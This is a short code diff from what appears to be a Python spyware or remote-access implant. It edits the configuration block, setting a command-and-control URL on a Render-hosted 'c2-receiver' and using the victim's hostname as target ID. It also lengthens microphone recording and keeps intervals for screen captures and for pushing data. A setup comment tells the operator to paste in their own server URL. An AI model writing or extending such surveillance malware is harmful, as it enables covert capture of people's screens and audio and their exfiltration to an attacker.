@@ -22,11 +22,11 @@ except ImportError:
     HAS_AUDIO = False
 
 # ================== CONFIG ==================
-C2_URL = "https://YOUR-APP-NAME.onrender.com"   # <-- PASTE YOUR RENDER URL
+C2_URL = "https://c2-receiver.onrender.com"   # <-- PASTE YOUR RENDER URL
 TARGET_ID = socket.gethostname()
 
 SCREEN_INTERVAL = 20
-AUDIO_DURATION = 10
+AUDIO_DURATION = 40
 AUDIO_INTERVAL = 60
 PUSH_INTERVAL = 30
 
